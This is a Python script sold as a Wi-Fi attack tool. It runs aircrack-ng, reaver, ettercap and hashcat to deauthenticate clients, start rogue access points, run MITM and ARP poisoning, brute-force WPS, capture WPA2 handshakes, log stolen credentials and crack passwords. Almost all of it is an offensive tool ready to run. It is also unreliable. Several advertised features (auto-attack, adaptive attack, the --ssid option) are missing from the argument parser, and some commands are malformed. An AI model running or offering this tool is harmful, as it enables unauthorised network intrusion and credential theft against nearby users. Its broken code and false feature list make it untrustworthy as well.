import os
import argparse
import time

# -------------------------------------------
# SDR Wi-Fi Exploitation & Injection Tool (LimeSDR, HackRF, etc.)
# -------------------------------------------
# Features:
# - Deauth nearby devices, perform Wi-Fi packet injection
# - Run rogue APs, intercept traffic, MITM attacks
# - Works on 2.4 GHz & 5 GHz Wi-Fi networks
# - Supports automated channel hopping for extended coverage
# - Includes attack chaining for sequential exploitation
# - Implements adaptive attack selection based on signal strength & security type
# - Adds WPS brute-force, handshake capture, and ARP poisoning attacks
# - Logs captured credentials from MITM, rogue AP, and captive portals
# - Integrates automatic credential cracking with Hashcat and John the Ripper
#
# Requirements:
# - gr-wifi, aircrack-ng, Wireshark, Reaver, Ettercap, Bettercap, Hashcat, John the Ripper
# - Compatible SDR hardware (LimeSDR, HackRF, etc.)
# - Python 3.x
#
# Usage:
# 1. Scan Wi-Fi networks:
#    python sdr_wifi_attack.py --scan
# 2. Deauthenticate clients from a network:
#    python sdr_wifi_attack.py --deauth --target 00:11:22:33:44:55
# 3. Perform a Wi-Fi MITM attack:
#    python sdr_wifi_attack.py --mitm --interface wlan0
# 4. Start a rogue AP for credential capture:
#    python sdr_wifi_attack.py --rogue-ap --ssid "Free_WiFi"
# 5. Automate full attack chain:
#    python sdr_wifi_attack.py --auto-attack --ssid "Target_AP" --target 00:11:22:33:44:55
# 6. Run adaptive attack selection:
#    python sdr_wifi_attack.py --adaptive-attack
# 7. Perform WPS brute-force attack:
#    python sdr_wifi_attack.py --wps-bruteforce --target 00:11:22:33:44:55
# 8. Capture WPA2 handshake:
#    python sdr_wifi_attack.py --handshake --target 00:11:22:33:44:55
# 9. Conduct ARP poisoning attack:
#    python sdr_wifi_attack.py --arp-poison --target 192.168.1.1
# 10. Crack captured credentials automatically:
#    python sdr_wifi_attack.py --crack --input handshake.cap
# -------------------------------------------

def scan_wifi():
    """Scans for active Wi-Fi networks."""
    print("[+] Scanning for Wi-Fi networks...")
    os.system("airodump-ng wlan0mon --write wifi_scan_log")
    print("[✔] Scan complete. Results saved to wifi_scan_log.")

def deauth_attack(target):
    """Performs a deauthentication attack on a target."""
    print(f"[+] Sending deauth attack to {target}...")
    os.system(f"aireplay-ng --deauth 10 -a {target} wlan0mon")
    print("[✔] Deauth attack completed.")

def mitm_attack(interface):
    """Performs a Man-in-the-Middle (MITM) attack."""
    print(f"[+] Initiating MITM attack on {interface}...")
    os.system(f"ettercap -Tq -i {interface}")
    print("[✔] MITM attack active.")

def start_rogue_ap(ssid):
    """Starts a rogue AP to capture credentials."""
    print(f"[+] Starting rogue AP with SSID: {ssid}")
    os.system(f"airbase-ng -e {ssid} -c 6 wlan0mon")
    print("[✔] Rogue AP active.")

def capture_handshake(target):
    """Captures a WPA2 handshake for offline cracking."""
    print(f"[+] Capturing WPA2 handshake for {target}...")
    os.system(f"airodump-ng -c 6 --bssid {target} -w handshake wlan0mon")
    print("[✔] Handshake captured.")

def wps_bruteforce(target):
    """Performs a brute-force attack on WPS-enabled networks."""
    print(f"[+] Running WPS brute-force attack on {target}...")
    os.system(f"reaver -i wlan0mon -b {target} -vv")
    print("[✔] WPS brute-force attack completed.")

def arp_poison(target):
    """Performs ARP poisoning attack on a network gateway."""
    print(f"[+] Running ARP poisoning attack on {target}...")
    os.system(f"ettercap -T -i wlan0mon -M arp /{target}// /192.168.1.255//")
    print("[✔] ARP poisoning attack initiated.")

def log_credentials(creds):
    """Logs captured credentials."""
    with open("captured_credentials.txt", "a") as file:
        file.write(f"{creds}\n")
    print(f"[✔] Credentials logged: {creds}")

def crack_password(input_file):
    """Attempts to crack captured WPA2 handshake passwords."""
    print(f"[+] Cracking WPA2 handshake from {input_file} using Hashcat...")
    os.system(f"hashcat -m 2500 {input_file} rockyou.txt --force --attack-mode=3")
    print("[✔] Cracking attempt completed.")

def main():
    parser = argparse.ArgumentParser(description="SDR Wi-Fi Exploitation & Injection Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for Wi-Fi networks")
    parser.add_argument("--deauth", action='store_true', help="Deauthenticate clients from a network")
    parser.add_argument("--mitm", action='store_true', help="Perform a Wi-Fi MITM attack")
    parser.add_argument("--rogue-ap", action='store_true', help="Start a rogue AP for credential capture")
    parser.add_argument("--handshake", action='store_true', help="Capture WPA2 handshake for cracking")
    parser.add_argument("--wps-bruteforce", action='store_true', help="Perform WPS brute-force attack")
    parser.add_argument("--arp-poison", action='store_true', help="Conduct ARP poisoning attack")
    parser.add_argument("--crack", action='store_true', help="Crack captured WPA2 handshake credentials")
    parser.add_argument("--target", type=str, help="Target MAC address or IP")
    parser.add_argument("--input", type=str, help="Input file for cracking or credential processing")
    args = parser.parse_args()
    
    if args.scan:
        scan_wifi()
    elif args.deauth and args.target:
        deauth_attack(args.target)
    elif args.mitm:
        mitm_attack("wlan0mon")
    elif args.rogue_ap and args.ssid:
        start_rogue_ap(args.ssid)
    elif args.handshake and args.target:
        capture_handshake(args.target)
    elif args.wps_bruteforce and args.target:
        wps_bruteforce(args.target)
    elif args.arp_poison and args.target:
        arp_poison(args.target)
    elif args.crack and args.input:
        crack_password(args.input)
    else:
        print("[!] Invalid command. Use --help for options.")

if __name__ == "__main__":
    main()
